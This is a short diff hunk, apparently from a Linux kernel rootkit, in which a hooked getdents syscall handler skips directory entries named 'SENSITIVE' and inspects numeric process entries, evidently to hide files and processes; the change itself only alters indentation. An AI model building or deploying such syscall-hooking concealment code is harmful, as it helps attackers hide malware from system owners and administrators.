@@ -113,7 +113,7 @@ asmlinkage int hook_getdents(const struct pt_regs* regs)
         if (strstr(d->d_name, "SENSITIVE")) {
             shift_by = d->d_reclen; 
             goto shift_and_iter;
-	    } else if (is_numeric(d->d_name)) {
+    	} else if (is_numeric(d->d_name)) {
             int pid;
             if (kstrtoint(d->d_name, 10, &pid) == 0) {
                 char *cmdline;
